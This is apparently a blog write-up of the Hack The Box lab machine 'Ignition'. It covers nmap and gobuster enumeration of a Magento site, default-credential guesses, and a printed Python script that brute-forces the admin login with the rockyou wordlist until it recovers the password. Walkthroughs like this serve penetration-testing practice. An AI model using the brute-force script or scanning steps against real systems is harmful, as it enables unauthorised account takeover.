---
layout: post
title: ignition
categories: htb
tags:
- htb
- starting_point
- ignition
author: nicoliboli
description: starting point | tier 1 | box 5
---

# enumeration

```
$ nmap 10.129.1.27       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 16:56 EDT
Nmap scan report for 10.129.1.27
Host is up (0.096s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds

$ nmap -p- --min-rate 1000 10.129.1.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 16:57 EDT
Warning: 10.129.1.27 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.1.27
Host is up (0.10s latency).
Not shown: 65467 closed tcp ports (conn-refused), 67 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 82.93 seconds

$ nmap -sC -sV -p 80 10.129.1.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 16:57 EDT
Nmap scan report for 10.129.1.27
Host is up (0.098s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

with the redirect, update `/etc/hosts` to include that domain

```
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.1.27     ignition.htb
```

## port 80

navigate to the page and notice that it is powered by magento. there is also a sign in and a create an account option

![ignition_home](/assets/img/ignition_home.png)

let `gobuster` run and see a couple subdirectories

```
$ gobuster dir -u http://ignition.htb -w /usr/share/wordlists/dirb/common.txt    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ignition.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 200) [Size: 25803]
/admin                (Status: 200) [Size: 7095]
/catalog              (Status: 302) [Size: 0] [--> http://ignition.htb/]
/checkout             (Status: 302) [Size: 0] [--> http://ignition.htb/checkout/cart/]
/cms                  (Status: 200) [Size: 25817]
/contact              (Status: 200) [Size: 28673]
/enable-cookies       (Status: 200) [Size: 27176]
/errors               (Status: 301) [Size: 185] [--> http://ignition.htb/errors/]
/home                 (Status: 200) [Size: 25802]
/Home                 (Status: 301) [Size: 0] [--> http://ignition.htb/home]
/index.php            (Status: 200) [Size: 25815]
/media                (Status: 301) [Size: 185] [--> http://ignition.htb/media/]
/opt                  (Status: 301) [Size: 185] [--> http://ignition.htb/opt/]
/rest                 (Status: 400) [Size: 52]
/robots.txt           (Status: 200) [Size: 1]
/robots               (Status: 200) [Size: 1]
/setup                (Status: 301) [Size: 185] [--> http://ignition.htb/setup/]
/soap                 (Status: 200) [Size: 391]
/static               (Status: 301) [Size: 185] [--> http://ignition.htb/static/]
/wishlist             (Status: 302) [Size: 0] [--> http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

the `admin` directory looks juicy, so go there

![ignition_admin](/assets/img/ignition_admin.png)

tried entering default creds of `admin:123123` found [here](https://magento.stackexchange.com/questions/231135/what-is-the-default-magento-admin-username-and-password) and get an error. also tried `admin:admin`

![ignition_default_creds](/assets/img/ignition_default_creds.png)

# exploitation

i tried hydra, but got a hit on multiple passwords. instead i'm just going to throw together a quick python script instead. first i have to see what the login request looks like in burp with the creds `admin:password`

![ignition_burp_login](/assets/img/ignition_burp_login.png)

i'm going to go ahead and compare my python generated request before trying to brute force. i'm also going to pull out some headers and make sure to include those, as well as the POST data. then i'm going look for a string to match an incorrect login to see if the password is found.

![ignition_burp_compare](/assets/img/ignition_burp_compare.png)

those look pretty similar. i skimmed the request and response just to be sure that the length wasn't giving me false hope. below is the script i used (it's super slow, i know... one of these days i'll sit down and do a proper template with threads, but not today)

```
$ cat req.py    
import sys
import requests
import argparse
from random import randrange
from bs4 import BeautifulSoup

proxy = { "http" : "http://127.0.0.1:8080" }

parser = argparse.ArgumentParser(epilog="ex: python {} -u http://ignition.htb/admin -U admin".format(sys.argv[0]))

parser.add_argument('-u', '--url', required=True, help='url')
parser.add_argument('-U', '--username', required=True, help='username')
args = parser.parse_args()

passwords = []
with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    passwords = f.readlines()

for password in passwords:
    data = { "form_key" :"YS6Op9hJZsMyNfKr",
            "login[username]" : args.username,
            "login[password]" : password.decode().strip() }

    print("[*] sending login for {}:{}".format(args.username, password.decode().strip()))

    headers = { "Origin" : "http://ignition.htb/admin",
               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
               "Cookie" : "admin=2ip3uu6cis7s4r4r9fav55a3bu; form_key=4P3NXGkQgkgpDKDh" }

    r = requests.post("{}".format(args.url), data=data, proxies=proxy, headers=headers)
    if r.text.find("incorrect") == -1:
        print("[*] PASSWORD FOUND!")
        print("[+] {} : {}".format(args.username, password.decode().strip()))
        break

$ python3 req.py -u http://ignition.htb/admin -U admin
[*] sending login for admin:123456
...
[*] sending login for admin:qwerty123

[*] PASSWORD FOUND!
[+] admin : qwerty123
```

login with the credentials `admin:qwerty123`

![ignition_dashboard](/assets/img/ignition_dashboard.png)
